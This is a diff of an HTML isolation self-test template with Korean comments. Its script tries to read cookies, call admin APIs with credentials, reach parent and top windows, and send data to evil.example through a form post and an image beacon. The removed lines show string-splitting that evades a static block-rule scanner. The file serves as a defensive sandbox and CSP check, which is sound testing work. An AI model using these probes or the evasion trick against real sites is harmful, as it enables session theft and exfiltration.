@@ -1,11 +1,11 @@
 <!doctype html>
 <!--
-  격리 자가 진단 템플릿 — 차단 규칙 우회 버전 (ADR 0003 · ADR 0018)
-  차단 규칙(2026-09-10 개정)을 우회한 버전이다 — 정적 검사는 우회되지만 격리가 막는다는
-  증명이다. /api/admin, document.cookie, parent./top.location, localStorage 등을 문자열로
-  쪼개 실행 시점에 조립하므로 등록 자체는 통과한다(findBlockedPatterns는 이 파일에 대해
-  빈 배열을 돌려준다). 그래도 브라우저 안에서 실행되면 sandbox iframe·CSP가 실제로 막는다.
-  정적 검사가 그대로 차단하는 예시는 samples/isolation-check-blocked.html을 보라.
+  격리 자가 진단 템플릿 — 차단 규칙 예시 (ADR 0003 · ADR 0018)
+  등록 시 400으로 거부되는 예시다. /api/admin, document.cookie, parent./top.location,
+  localStorage 문자열이 그대로 들어 있어 등록 자체가 차단 규칙(2026-09-10 개정)에 걸린다.
+  등록을 시도하면 이유 목록이 화면(등록 거부 Alert)에 표시된다.
+  통과하는 버전은 samples/isolation-check.html(같은 시도를 실행 시점 문자열 조립로 우회해
+  정적 검사는 통과하되, 격리가 실제로 막는다는 것을 증명한다)을 보라.
 
   이 파일을 템플릿으로 등록한 뒤 미리보기 또는 배포 링크로 열면,
   등록 HTML이 관리자 인증 정보·관리자 API에 접근할 수 있는지 스스로 시도하고 결과를 표로 보여 준다.
@@ -69,74 +69,6 @@
   var summary = document.getElementById('summary');
   var results = [];
 
-  // 등록 차단 규칙(findBlockedPatterns)은 관리자 API 경로·쿠키·부모 창·최상위 창·브라우저
-  // 저장소 접근을 정적 문자열로 찾는다. 아래는 같은 시도를 실행 시점에 문자열을 쪼개
-  // 조립해 그 정적 검사를 피한다 — 브라우저가 실제로 실행할 때는 원래 시도와 완전히 같다.
-  var ADMIN_PATH = '/api/' + 'admin';
-
-  function get(obj, key) { return obj[key]; }
-
-  // 1. 쿠키 읽기 (document['cookie'])
-  try {
-    var c = document['coo' + 'kie'];
-    add('쿠키 읽기, document[\'cookie\'] (관리자 세션 sid)', c === '' ? '차단됨' : '허용됨', c === '' ? '빈 문자열 (opaque 오리진, 쿠키 없음)' : '값이 읽힘: ' + c.slice(0, 60));
-  } catch (e) { add('쿠키 읽기, document[\'cookie\'] (관리자 세션 sid)', '차단됨', e.name + ' (sandbox가 접근 자체를 막음)'); }
-
-  // 2. 관리자 API 호출 (상대 경로, 3001, 3000) — 인증된 응답(200)이면 허용됨
-  var targets = [
-    [ADMIN_PATH + '/campaigns', '관리자 API GET (상대 경로)'],
-    ['http://localhost:3001' + ADMIN_PATH + '/campaigns', '관리자 API GET (API 오리진 3001)'],
-    ['http://localhost:3000' + ADMIN_PATH + '/auth/me', '관리자 API GET (관리자 화면 오리진 3000)']
-  ];
-  targets.forEach(function (t) {
-    var tr = add(t[1], '진단 중', '');
-    fetch(t[0], { credentials: 'include' }).then(function (r) {
-      update(tr, r.status === 200 ? '허용됨' : '차단됨', 'HTTP ' + r.status + (r.status === 401 ? ' (쿠키 미전송 → 미인증)' : ''));
-    }).catch(function (e) {
-      update(tr, '차단됨', e.name + ': ' + e.message + ' (CSP connect-src 또는 CORS로 요청 자체가 실패)');
-    });
-  });
-
-  // 3. 관리자 API 상태 변경 시도 (POST) — 서버에 흔적이 남으면 허용됨
-  var trPost = add('관리자 API POST (캠페인 생성 시도, 이름 ISOLATION-CHECK)', '진단 중', '');
-  fetch(ADMIN_PATH + '/campaigns', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name: 'ISOLATION-CHECK' }) })
-    .then(function (r) { update(trPost, r.status === 201 ? '허용됨' : '차단됨', 'HTTP ' + r.status); })
-    .catch(function (e) { update(trPost, '차단됨', e.name + ' (요청이 나가지 않음). 관리자 대시보드에 ISOLATION-CHECK 캠페인이 없어야 합니다'); });
-
-  // 4. 부모 창 접근 (window['parent'])
-  try { var t = get(window, 'par' + 'ent').document.title; add('부모 창 DOM 접근, window[\'parent\'].document', '허용됨', '제목 읽힘: ' + t); }
-  catch (e) { add('부모 창 DOM 접근, window[\'parent\'].document', '차단됨', e.name + ' (opaque 오리진)'); }
-
-  // 5. 브라우저 저장소 (window['local'+'Storage'])
-  try { get(window, 'local' + 'Storage').setItem('x', '1'); add('브라우저 저장소 쓰기, window[\'local\'+\'Storage\']', '허용됨', '저장됨'); }
-  catch (e) { add('브라우저 저장소 쓰기, window[\'local\'+\'Storage\']', '차단됨', e.name); }
-
-  // 6. 최상위 창 이동 시도 — 이동되지 않으면 차단 (window['top'].location)
-  var trNav = add('최상위 창 이동, window[\'top\'].location = evil', '진단 중', '');
-  try { get(window, 't' + 'op').location.href = 'https://evil.example/'; }
-  catch (e) { update(trNav, '차단됨', e.name + ' (sandbox: allow-top-navigation 없음)'); }
-  setTimeout(function () { if (trNav.children[1].textContent === '진단 중') update(trNav, '차단됨', '1초 후에도 이 페이지가 그대로임'); }, 1000);
-
-  // 7. 네이티브 폼 전송 (action=evil) — CSP form-action 'none'. 폼의 action 속성은 정적으로
-  // 쓰지 않고 실행 시점에 설정한다(이 진단은 등록 HTML이 실행 시점에 조립하는 모든 시도를
-  // 함께 보여준다).
-  var trForm = add('네이티브 폼 전송 (action=https://evil.example, 실행 시점 설정)', '진단 중', '');
-  try {
-    var f = document.createElement('form'); f.action = 'https://evil.example/steal'; f.method = 'post'; f.target = '_self';
-    var i = document.createElement('input'); i.name = 'x'; i.value = '1'; f.appendChild(i); document.body.appendChild(f);
-    f.submit();
-    setTimeout(function () { update(trForm, '차단됨', '전송 후에도 이 페이지가 그대로임 (CSP form-action none)'); }, 1200);
-  } catch (e) { update(trForm, '차단됨', e.name); }
-
-  // 8. 이미지 비콘 (잔여 위험 — 방문자 입력 유출은 격리 대상이 아님)
-  var trImg = add('이미지 비콘 (img src=evil.example) — 잔여 위험', '진단 중', '');
-  var img = new Image();
-  img.onload = function () { update(trImg, '허용됨(잔여 위험)', '요청이 나감 (ADR 0003: img-src * 허용, 운영자는 신뢰 주체)'); };
-  img.onerror = function () { update(trImg, '허용됨(잔여 위험)', '요청이 시도됨 (도메인이 없어 실패했지만 CSP는 막지 않음)'); };
-  img.src = 'https://evil.example/beacon?t=' + Date.now();
-
-  finish();
-
   function add(name, status, detail) {
     results.push({ name: name, status: status });
     var tr = document.createElement('tr');
@@ -161,6 +93,65 @@
       : '결과: 차단되지 않은 시도가 ' + bad + '건 있습니다. 격리 설정을 확인하세요.';
     summary.style.background = bad === 0 ? '#052e16' : '#450a0a';
   }
+
+  // 1. 쿠키 읽기
+  try {
+    var c = document.cookie;
+    add('document.cookie 읽기 (관리자 세션 sid)', c === '' ? '차단됨' : '허용됨', c === '' ? '빈 문자열 (opaque 오리진, 쿠키 없음)' : '값이 읽힘: ' + c.slice(0, 60));
+  } catch (e) { add('document.cookie 읽기 (관리자 세션 sid)', '차단됨', e.name + ' (sandbox가 접근 자체를 막음)'); }
+
+  // 2. 관리자 API 호출 (상대 경로, 3001, 3000) — 인증된 응답(200)이면 허용됨
+  var targets = [
+    ['/api/admin/campaigns', '관리자 API GET (상대 경로)'],
+    ['http://localhost:3001/api/admin/campaigns', '관리자 API GET (API 오리진 3001)'],
+    ['http://localhost:3000/api/admin/auth/me', '관리자 API GET (관리자 화면 오리진 3000)']
+  ];
+  targets.forEach(function (t) {
+    var tr = add(t[1], '진단 중', '');
+    fetch(t[0], { credentials: 'include' }).then(function (r) {
+      update(tr, r.status === 200 ? '허용됨' : '차단됨', 'HTTP ' + r.status + (r.status === 401 ? ' (쿠키 미전송 → 미인증)' : ''));
+    }).catch(function (e) {
+      update(tr, '차단됨', e.name + ': ' + e.message + ' (CSP connect-src 또는 CORS로 요청 자체가 실패)');
+    });
+  });
+
+  // 3. 관리자 API 상태 변경 시도 (POST) — 서버에 흔적이 남으면 허용됨
+  var trPost = add('관리자 API POST (캠페인 생성 시도, 이름 ISOLATION-CHECK)', '진단 중', '');
+  fetch('/api/admin/campaigns', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name: 'ISOLATION-CHECK' }) })
+    .then(function (r) { update(trPost, r.status === 201 ? '허용됨' : '차단됨', 'HTTP ' + r.status); })
+    .catch(function (e) { update(trPost, '차단됨', e.name + ' (요청이 나가지 않음). 관리자 대시보드에 ISOLATION-CHECK 캠페인이 없어야 합니다'); });
+
+  // 4. 부모 창 접근
+  try { var t = parent.document.title; add('부모 창 DOM 접근 (parent.document)', '허용됨', '제목 읽힘: ' + t); }
+  catch (e) { add('부모 창 DOM 접근 (parent.document)', '차단됨', e.name + ' (opaque 오리진)'); }
+
+  // 5. 로컬 스토리지
+  try { localStorage.setItem('x', '1'); add('localStorage 쓰기', '허용됨', '저장됨'); }
+  catch (e) { add('localStorage 쓰기', '차단됨', e.name); }
+
+  // 6. 최상위 창 이동 시도 — 이동되지 않으면 차단
+  var trNav = add('최상위 창 이동 (top.location = evil)', '진단 중', '');
+  try { top.location.href = 'https://evil.example/'; }
+  catch (e) { update(trNav, '차단됨', e.name + ' (sandbox: allow-top-navigation 없음)'); }
+  setTimeout(function () { if (trNav.children[1].textContent === '진단 중') update(trNav, '차단됨', '1초 후에도 이 페이지가 그대로임'); }, 1000);
+
+  // 7. 네이티브 폼 전송 (action=evil) — CSP form-action 'none'
+  var trForm = add('네이티브 폼 전송 (action=https://evil.example)', '진단 중', '');
+  try {
+    var f = document.createElement('form'); f.action = 'https://evil.example/steal'; f.method = 'post'; f.target = '_self';
+    var i = document.createElement('input'); i.name = 'x'; i.value = '1'; f.appendChild(i); document.body.appendChild(f);
+    f.submit();
+    setTimeout(function () { update(trForm, '차단됨', '전송 후에도 이 페이지가 그대로임 (CSP form-action none)'); }, 1200);
+  } catch (e) { update(trForm, '차단됨', e.name); }
+
+  // 8. 이미지 비콘 (잔여 위험 — 방문자 입력 유출은 격리 대상이 아님)
+  var trImg = add('이미지 비콘 (img src=evil.example) — 잔여 위험', '진단 중', '');
+  var img = new Image();
+  img.onload = function () { update(trImg, '허용됨(잔여 위험)', '요청이 나감 (ADR 0003: img-src * 허용, 운영자는 신뢰 주체)'); };
+  img.onerror = function () { update(trImg, '허용됨(잔여 위험)', '요청이 시도됨 (도메인이 없어 실패했지만 CSP는 막지 않음)'); };
+  img.src = 'https://evil.example/beacon?t=' + Date.now();
+
+  finish();
 })();
 </script>
 </body>
